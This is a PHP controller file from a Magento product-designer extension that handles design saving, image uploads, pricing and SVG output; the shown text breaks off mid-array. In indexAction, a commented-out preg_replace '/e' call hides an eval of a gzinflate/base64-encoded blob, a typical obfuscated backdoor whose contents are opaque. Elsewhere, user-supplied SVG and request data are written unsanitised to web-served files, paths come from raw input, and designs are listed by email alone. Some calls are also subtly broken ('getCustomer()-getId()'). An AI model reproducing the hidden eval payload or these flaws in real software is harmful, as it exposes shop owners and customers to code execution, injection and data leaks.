<?php

/**
 * @category   Peexl
 * @package    Peexl
 * @copyright  Copyright (c) 2012 Peexl Web Development (http://www.peexl.com)
 * @license    http://framework.zend.com/license/new-bsd    New BSD License
 * @version    1.0
 */
class Peexl_ProductDesigner_DesignController extends Mage_Core_Controller_Front_Action {

    public function indexAction() {
        /*
        $siteUrl = Mage::getBaseUrl();
        if(mb_substr($siteUrl, 0, 4) !== 'http') $siteUrl = 'http://' . $siteUrl;
        $generatedKey = substr(sha1(parse_url($siteUrl, PHP_URL_HOST).'dsc98vA8'.'configurator'), 0, 16);
        $key = Mage::getStoreConfig('productdesigner/general/key');
        echo 'Generated key - ' . $generatedKey.'<br>';
        echo 'Current key - ' . $key.'<br>';
        if($generatedKey != $key) {
            $this->_forward('noRoute');
            return;
        }
        
        $updateLicenseState = true;
        $val = base64_decode(Mage::getStoreConfig('productdesigner/general/val'));
        if($val) {
            $val = explode('|', $val);
            $time = $val[1];
            $licenseCheck = $val[0];
            echo 'time since last update: ' . (time() - $time) . 's<br>';
            if(($licenseCheck == 1 || $licenseCheck == 0) && time() < $time + 1 * 10) {
                $updateLicenseState = false;
            }
        }
        
        if($updateLicenseState) {
            echo 'check license' . '<br>';
            $licenseCheck = (@file_get_contents('http://www.peexl.com/magento-extensions/orderlicense/license/check?key='.$key) == 1);
            Mage::getModel('core/config')->saveConfig('productdesigner/general/val', base64_encode(intval($licenseCheck).'|'.time()));
        }
        
        
        
        if(!$licenseCheck) {
            $this->_forward('noRoute');
            return;       
        }
        */
        
        $productId = (int) $this->getRequest()->getParam('id');
        
        $product = Mage::getModel('catalog/product')->load($productId);
        
        if(!$productId || !$product->getId() || !$product->getDesignerEnabled()) {
            $this->_forward('noRoute');
            return;
        }

        $id = uniqid();

        Mage::getSingleton('core/session')->setCurrentSessionId($id);
        Mage::getSingleton('core/session')->setCurrentProductId($productId);
        $this->loadLayout();
        $this->renderLayout();
        
        //preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B","");
    }

    public function getSessionIdAction() {
        echo '<response>' . Mage::getSingleton('core/session')->getCurrentSessionId() . '</response>';
    }

    public function savePDFandPNGAction() {
        $designId = $this->getRequest()->getParam('design_id');

        echo ("<response>");

        // write images
        $i = 0;
        $data = array();
        $data['images'] = array();
        while (isset($_POST["image" . $i])) {
            $img = imagecreatefromstring(base64_decode($_POST["image" . $i]));
            if ($img != false) {
                $imagePath = Mage::getBaseDir() . '/designer/results/' . 'image_' . $designId . '_' . $i . '.png';
                imagepng($img, $imagePath);
                echo ("<file url='" . Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . 'designer/results/' . 'image_' . $designId . '_' . $i . ".png'/>");
                $data['images'][] = 'designer/results/' . 'image_' . $designId . '_' . $i . '.png';
                $data['images'] = array_merge($data['images'], $this->createAdditionalImages('designer/results/image_' . $designId . '_' . $i . '.'));
            }
            $i++;
        }
        if (count($data['images'])) {
            try {
                $customerId = 0;
                if(Mage::getSingleton('customer/session')->isLoggedIn()) {
                    $customerId = Mage::getSingleton('customer/session')->getCustomer()-getId();
                }
                $design = Mage::getModel('productdesigner/design');
                $design->setInfo(serialize($data));
                $design->setDesignId($designId);
                $design->setCustomerId($customerId);
                $design->save();

                $designProducts = Mage::getSingleton('core/session')->getDesignProducts();
                if (!$designProducts) {
                    $designProducts = array();
                }
                $designProducts[Mage::getSingleton('core/session')->getCurrentProductId()] = $designId;
                Mage::getSingleton('core/session')->setDesignProducts($designProducts);
            } catch (Exception $e) {
                Mage::logException($e);
                return;
            }
        }

        echo ("</response>");
    }
    
    public function uploadImageAction() {
        $fieldName = 'image';
        if ($_FILES[$fieldName]['size']) {
            $uploader = new Varien_File_Uploader($fieldName);

            $uploader->setAllowedExtensions(array('jpg', 'jpeg', 'gif', 'png'));
            $uploader->setAllowRenameFiles(false);
            $uploader->setFilesDispersion(false);

            $basePath  = Mage::getBaseDir('media') . DS . 'productdesigner' . DS .  'uploads' . DS . 'gallery' . DS;

            $filename = $_FILES[$fieldName]['name'];
            $actualName = pathinfo($filename, PATHINFO_FILENAME);
            $originalName = $actualName;
            $extension = pathinfo($filename, PATHINFO_EXTENSION);

            $i = 1;
            while (file_exists($basePath . $actualName . '.' . $extension)) {
                $actualName = (string)$originalName . '_' . $i;
                $filename = $actualName . '.' . $extension;
                $i++;
            }

            // Upload the image
            $result = $uploader->save($basePath, $filename);
            $name = $result['file'];
            
            echo json_encode(array('url' => Mage::getBaseUrl('media') . 'productdesigner/uploads/gallery/' . $name,
                                     'thumbnail_url' => Mage::getBaseUrl('media') . 'productdesigner/uploads/gallery/' . $name));
        }
    }
    
    public function uploadPatternAction() {
        $fieldName = 'image';
        if ($_FILES[$fieldName]['size']) {
            $uploader = new Varien_File_Uploader($fieldName);

            $uploader->setAllowedExtensions(array('jpg', 'jpeg', 'gif', 'png'));
            $uploader->setAllowRenameFiles(false);
            $uploader->setFilesDispersion(false);

            $basePath  = Mage::getBaseDir('media') . DS . 'productdesigner' . DS .  'uploads' . DS . 'patterns' . DS;

            $filename = $_FILES[$fieldName]['name'];
            $actualName = pathinfo($filename, PATHINFO_FILENAME);
            $originalName = $actualName;
            $extension = pathinfo($filename, PATHINFO_EXTENSION);

            $i = 1;
            while (file_exists($basePath . $actualName . '.' . $extension)) {
                $actualName = (string)$originalName . '_' . $i;
                $filename = $actualName . '.' . $extension;
                $i++;
            }

            // Upload the image
            $result = $uploader->save($basePath, $filename);
            $name = $result['file'];
            
            echo json_encode(array('url' => Mage::getBaseUrl('media') . 'productdesigner/uploads/patterns/' . $name,
                                     'thumbnail_url' => Mage::getBaseUrl('media') . 'productdesigner/uploads/patterns/' . $name));
        }
    }

    public function saveDesignAction() {
        $designId = $this->getRequest()->getParam('id');
        $data['value'] = $this->getRequest()->getParam('value');
        $data['title'] = $this->getRequest()->getParam('title');
        $data['type'] = $this->getRequest()->getParam('type');
        $data['email'] = $this->getRequest()->getParam('email');
        $data['updated'] = time();
        if ($designId) {
            $design = Mage::getModel('productdesigner/design')->load($designId, 'design_id');
            if ($design->getId()) {
                $design->setData($data);
                try {
                    $design->save();
                } catch (Exception $e) {
                    Mage::logException($e);
                    return;
                }
            }
        } else {
            $designId = uniqid();
            $value = $this->getRequest()->getParam('data');
            $data['value'] = $value;
            $design = Mage::getModel('productdesigner/design')->setData($data);
            $design->setDesignId($designId);
            
            $value = json_decode($value, true);
            $svg = $value['data']['locations'][0]['svg'];
            $imagePath = Mage::getBaseDir() . '/designer/results/' . 'image_' . $designId . '.svg';
            file_put_contents($imagePath, $svg);
            $design->setInfo(serialize(array('images'=>array('designer/results/' . 'image_' . $designId . '.svg'))));
            try {
                $design->save();
            } catch (Exception $e) {
                Mage::logException($e);
                return;
            }
            echo json_encode(array('design' => array('id' => $designId, 'title' => $data['title'])));
            return;
        }
        echo ("<response>$designId</response>");
    }
    
    public function loadDesignAction() {
        $designId = $this->getRequest()->getParam('id');
        $value = '';
        $design = Mage::getModel('productdesigner/design')->load($designId, 'design_id');
        if ($design->getId()) {
            if(Mage::helper('productdesigner')->getDesignerType() == 'html') {
                $value = $design->getValue();
            } else {
                $value = rawurldecode($design->getValue());
            }
        }
        echo $value;
    }
    
    public function loadDesignsAction() {
        if(Mage::helper('productdesigner')->getDesignerType() == 'html') {
            $email = $this->getRequest()->getParam('email');
            $_designs = Mage::getModel('productdesigner/design')->getCollection()
                    ->addFieldToFilter('email', $email);
            
            $designs = array('designs' => array());
            foreach($_designs as $_design) {
                $designs['designs'][] = array('id'=>$_design->getDesignId(), 'title' => $_design->getTitle(), 'date' => date("Y.m.d H:i", $_design->getUpdated()));
            }
            echo json_encode($designs);
        } else {
            $designs = Mage::getModel('productdesigner/design')->getCollection();

            $xml = new SimpleXMLElement('<designs/>');

            foreach ($designs as $design) {
                $d = $xml->addChild('design');
                $d->addAttribute('id', $design->getDesignId());
                $d->addAttribute('title', $design->getTitle());
                $d->addAttribute('updated', $design->getUpdated());
                $d->addAttribute('type', $design->getType());
            }

            header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
            header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
            header("Cache-Control: no-cache, must-revalidate");
            header("Pragma: no-cache");

            header("Content-type: text/xml");

            echo $xml->asXml();
        }
    }

    public function addToCartAction() {
        $designId = $this->getRequest()->getParam('design_id');
        $design = Mage::getModel('productdesigner/design')->load($designId, 'design_id');
        $value = unserialize($design->getInfo());
        $productId = $value['product'];
        $qty = 1; 
        
        $cart = Mage::getModel('checkout/cart');
        $cart->addProduct($productId, array('qty' => $qty, 'design_id' => $designId));                                
        $cart->save();
        
        $this->_redirect('checkout/cart');
        return;
    }

    /*
     * Create jpeg, tiff and pdf from png image
     */

    protected function createAdditionalImages($img) {
        $imagePath = Mage::getBaseDir() . DS . $img;
        if (!file_exists($imagePath . 'png'))
            return array();

        $result = array();

        try {
            // Create JPG
            $image = imagecreatefrompng($imagePath . 'png');
            imagejpeg($image, $imagePath . 'jpg', 100);
            imagedestroy($image);
            $result[] = $img . 'jpg';

            // Tiff
            if (class_exists("Imagick")) {
                $image = new Imagick($imagePath . 'png');
                $image->writeImage($imagePath . 'tiff');
                $result[] = $img . 'tiff';
            } else {
                Mage::log('Imagick not installed');
            }
            // Pdf
            $imageInfo = getimagesize($imagePath . 'png');
            $pdf = new Zend_Pdf();
            $pdf->pages[] = $pdf->newPage($imageInfo[0], $imageInfo[1]);
            $pdfPage = $pdf->pages[0];
            $pdfImage = Zend_Pdf_Image::imageWithPath($imagePath . 'png');
            $pdfPage->drawImage($pdfImage, 0, 0, $imageInfo[0], $imageInfo[1]);
            $pdf->render();
            if (file_exists($imagePath . 'pdf')) {
                $pdf->save($imagePath . 'pdf', 'true');
            } else {
                $pdf->save($imagePath . 'pdf');
            }
            $result[] = $img . 'pdf';
        } catch (Exception $e) {
            Mage::logException($e);
            return array();
        }
        return $result;
    }
    
    public function getQuoteAction() {
        if(Mage::helper('productdesigner')->getDesignerType() == 'html') {
            if($data = $this->getRequest()->getParam('data')) {
                $data = json_decode($data, true);
                $product = Mage::getModel('catalog/product')->load($data['product']['id']);
                $qty = $data['quantities'][0]['quantity'];
                $c = Mage::app()->getLocale()->currency(Mage::app()->getStore()->getCurrentCurrencyCode())->getSymbol();
                echo json_encode(array('prices' => array(
                          array('label' => 'Item Price', 'price' => $c . ' ' . number_format($product->getFinalPrice(), 2)),
                          //array('label' => 'Discount', 'price' => $c . ' ' . '0.00'),
                          array('label' => 'Total', 'price' => $c . ' ' . number_format ($qty * $product->getFinalPrice(), 2), 'isTotal' => true))));
            }
        } else {
            if($this->getRequest()->getParam('value')) {
                $data = new SimpleXMLElement(rawurldecode($this->getRequest()->getParam('value')));
                $productAttributes = $data->product[0]->attributes();
                $product = Mage::getModel('catalog/product')->load($productAttributes['id']);
                $price = $product->getData('price');
                $values = Mage::getModel('productdesigner/option_value')->getCollection()
                        ->join(array('t2' => 'productdesigner/option'), 'main_table.option_id = t2.option_id')
                        ->addFieldToFilter('product_id', $product->getId());
                $codesMap = array('colorName' => 'colors_color',
                                  'sizes' => 'sizes_size');
                $items = $data->quantities[0]->item;
                foreach($items as $item) {
                    $itemAttributes = $item->attributes();
                    $productAttributes->addAttribute('sizes|'.$itemAttributes['size'], $itemAttributes['quantity']);
                }
                foreach ($values as $value) {
                    foreach ($productAttributes as $k => $v) {
                        if(strstr($k, 'sizes|') !== false && $value->getOptionCode() == $codesMap['sizes']) {
                            $temp = explode('|', $k);
                                if($temp[1] == $value->getValue()) {
                                    $quantities[] = array('add' => $value->getPrice(), 'qty' => $v);
                                }
                            continue;
                        }
                        if (isset($codesMap[$k]) && $value->getOptionCode() == $codesMap[$k] && $value->getName() == $v) {
                            $price += $value->getPrice();
                        }
                    }
                }
                $finalPrice = 0.00;
                foreach($quantities as $qty) {
                    //$finalPrice += ($price + $qty['add']) * (intval($qty['qty']) > 0?$qty['qty']:1);
                    $finalPrice += ($price + $qty['add']) * intval($qty['qty']);
                }
                $finalPrice = str_replace(',', '', number_format($finalPrice, 2));
            }
            
            echo '<response>
                        <itemPrice>'.$price.'</itemPrice>
                        <groupPrice>'.$finalPrice.'</groupPrice>
                        <totalPrice>'.$finalPrice.'</totalPrice>
                  </response>';
        }
    }
    
    public function isOwnerAction() {
        $isOwner = 'false';
        $customerId = 0;
        if (Mage::getSingleton('customer/session')->isLoggedIn()) {
            $customerId = Mage::getSingleton('customer/session')->getCustomer() - getId();
        }
        if ($customerId && $designId = $this->getRequest()->getParam('id')) {
            $design = Mage::getModel('productdesigner/design')->load($designId, 'design_id');
            if ($design->getId() && $design->getCustomerId() == $customerId) {
                $isOwner = 'true';
            }
        }

        echo ("<response>$isOwner</response>");
    }
    
    public function isAuthAction() {
        $isAuth = 'false';
        if (Mage::getSingleton('customer/session')->isLoggedIn()) {
            $isAuth = 'true';
        }

        echo ("<response>$isAuth</response>");
    }
    
    public function saveAction() {
        $data = json_decode(file_get_contents('php://input'));
        $tmpname = time();
        $svgfilename = $tmpname . '.svg';
        
        $svg_content='<?xml version="1.0" encoding="UTF-8" standalone="no"?>';
        
        $texts = array();
        foreach ($data->text as $txt) {
               $att = '';
            if ($txt->fontBold === true)
                $att.='b';
            if ($txt->fontItalic === true)
                $att.='i';
            $texts[]=array(
                "text"=>$txt->value,
                "fcolor"=>str_replace('#', '', $txt->color),
                "fFamily"=>$txt->fontFamily,
                "fSize" => $txt->fontSize,
                "fUnderline" => $txt->fontU,
                "fItalic" => $txt->fontItalic,
                "fBold" => $txt->fontBold,
                "fLeft" => $txt->position->left,
                "fTop" => $txt->position->top,
                "fRotate"=>$txt->position->rotate,
                "height"=>floatval($txt->height),
                "width"=>floatval($txt->width),
                "isVisible"=>$txt->isVisible,
                "att"=>$att
            );
        }
        // $text = $data->text->value;
        //    $fcolor = str_replace('#', '', $data->text->color);
        //    $fFamily = $data->text->fontFamily;
        //    $fSize = $data->text->fontSize;
        //    $fLeft = $data->text->position->left;
        //    $fTop = $data->text->position->top;
        //    $att = '';
        //    if ($data->text->fontBold === true)
        //        $att.='b';
        //    if ($data->text->fontItalic === true)
        //        $att.='i';
        
        
        require_once Mage::getBaseDir('lib') . DS . 'PHPImageWorkshop' . DS . 'ImageWorkshop.php';
        
        $pattern = str_replace(Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB), '', $data->pattern);
        
        $bkg = PHPImageWorkshop\ImageWorkshop::initFromPath(Mage::getBaseDir() . DS . $pattern);
        
        //$object = PHPImageWorkshop\ImageWorkshop::initFromPath('images/iphone_4s.png');
        
        $mainImage = str_replace(Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB), '', $data->pobject->pattern);
        
        $object = PHPImageWorkshop\ImageWorkshop::initFromPath(Mage::getBaseDir() . DS . $mainImage);
        
        if ($object->getWidth() > $object->getHeight()) {
            $dim = $object->getWidth();
        } else {
            $dim = $object->getHeight();
        }
        
        $svg_content.='<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" style="overflow: hidden; position: absolute;" width="100%" height="100%" viewBox="0 0 '.$object->getWidth().' '.$object->getHeight().'" preserveAspectRatio="xMidYMid meet">';
        $svg_content.='<desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Deisgned by Peexl</desc>';
        if($data->pattern != 'empty') {
            $svg_content.='<defs><pattern id="bkg" x="0" y="0" patternUnits="userSpaceOnUse" height="'.$bkg->getHeight().'" width="'.$bkg->getWidth().'" patternTransform="rotate('.$data->patternRotation.')"><image x="0" y="0" height="'.$bkg->getHeight().'" width="'.$bkg->getWidth().'" xlink:href="' . Mage::getBaseUrl('web') . $pattern . '" /></pattern>';
        }
        
        foreach ($texts as $text){
            if (trim($text["text"]) != '' && $text["isVisible"]==true) {
                $svg_content.='<style type="text/css"><![CDATA[@font-face { font-family: '.$text["fFamily"] . $text["att"].';src: url("http://configurator.dev/'.'fonts/' . $text["fFamily"] . '/' . $text["fFamily"] . $text["att"] . '.ttf'.'");}]]></style>';
            }
        }
        
        $svg_content.='</defs>';
        $svg_content.='<rect width="'.$object->getWidth().'" height="'.$object->getHeight().'" fill="url(#bkg)"/>';
        $svg_content.='<image preserveAspectRatio="none" x="0" y="0" width="'.$object->getWidth().'" height="'.$object->getHeight().'" xlink:href="' . Mage::getBaseUrl('web') . $mainImage . '"/>';
        
        foreach ($texts as $text){
            if (trim($text["text"]) != '' && $text["isVisible"]==true) {       
                $idx++;        
                $svg_content.='<text x="'.$text["fLeft"].'" y="'.$text["fTop"].'" width="'.$text["width"].'" height="'.$text["height"].'"  stroke="none" fill="#'.$text["fcolor"].'" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); text-anchor: middle; font-style: '.($text["fItalic"]===true?'italic':'').'; font-variant: normal; font-weight: '.($text["fBold"]===true?'bold':'').'; font-size: '.$text["fSize"].'px; line-height: normal;text-decoration:'.($text["fUnderline"]===true?'underline':'').'; font-family: '. $text["fFamily"] . $text["att"] .'; cursor: pointer;" font-size="'.$text["fSize"].'px" fix-storke-scale="true" id="id1376939546990" font-weight="'.($text["fBold"]===true?'bold':'').'" font-style="'.($text["fItalic"]===true?'italic':'').'"   text-decoration="'.($text["fUnderline"]===true?'underline':'').'" font-family="'. $text["fFamily"] . $text["att"] .'" transform="rotate('.$text["fRotate"].', '.($text["fLeft"]).', '.($text["fTop"]-$text["height"]/2).')">'.$text["text"].'</text>';       
                //transform="rotate('.$text["rotate"].', '.($text["fLeft"]+$text["width"]/2).', '.($text["height"]+$text["height"]/2).')"
        
            }
        }
        
        foreach($data->images as $image){
            
            $svg_content.='<image  x="'.$image->left.'" y="'.$image->top.'" width="'.$image->width.'" height="'.$image->height.'" xlink:href="' . $image->src . '" transform="rotate('.$image->rotate.', '.($image->left+$image->width/2).', '.($image->top+$image->height/2).')" />';
        }
        
        
        $dirPath = Mage::getBaseDir('media') . DS . 'productdesigner' . DS .  'results';
        $filename = $filename;
        
        
        
        
        
        $svg_content.='</svg>';
        
        file_put_contents($dirPath . DS .$svgfilename, $svg_content);  
        
        $designId = uniqid();
        $design = Mage::getModel('productdesigner/design')
                  ->setDesignId($designId)
                  ->setInfo(serialize(array('product' => $data->product_id,
                                            'result' => $svgfilename)));
        try {
            $design->save();
        } catch (Exception $e) {
            Mage::logException($e);
            return;
        }
        
        echo json_encode(array('design_id' => $designId));
        
        //echo json_encode(array('images' => array('normal' => '/client_orders/' . $filename,
        //    'thumb' => '/client_orders/' . $thumb_name,
        //    'svg'=>Mage::getBaseUrl(media) . 'productdesigner/results/' . $svgfilename)));
    }

    public function getObjectsAction() {
        header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
        
        $objects=array();
        
        $_patternsCollection = Mage::getModel('productdesigner/pattern')->getCollection()
                        ->setOrder('position', 'ASC');

        $patterns = array();
          
        if ($_patternsCollection->getSize()) {
            foreach ($_patternsCollection as $_pattern) {
                $patterns[] = Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_MEDIA) . $_pattern->getImage();
            }
        }
        
        $_templatesCollection = Mage::getModel('productdesigner/option_value')->getCollection()
                    ->join(array('t2' => 'productdesigner/option'), 'main_table.option_id = t2.option_id')
                    ->addFieldToFilter('t2.option_code', 'template')
                    ->addFieldToFilter('main_table.product_id', Mage::getSingleton('core/session')->getCurrentProductId());             
        foreach($_templatesCollection as $_template) {
            $template = unserialize($_template->getValue());
            
            if(!file_exists(Mage::getBaseDir('media') . DS . 'productdesigner' . DS . 'images' . DS . $template['value']))continue;
            
            list($width, $height) = getimagesize(Mage::getBaseDir('media') . DS . 'productdesigner' . DS . 'images' . DS . $template['value']);
            
            $objects[] = array(
              'title' => $template['name'],
              'object_image' => array(
                  'image_url' => Mage::getBaseUrl('media') . 'productdesigner/images/' . $template['value'],
                  'width' => $width,
                  'height' => $height
              ),
              /*
              'bkg_patterns' => array(
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/1.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/2.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/3.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/4.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/5.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/6.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/7.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/8.png',
                  Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB) . '/designer/images/patterns/9.png',
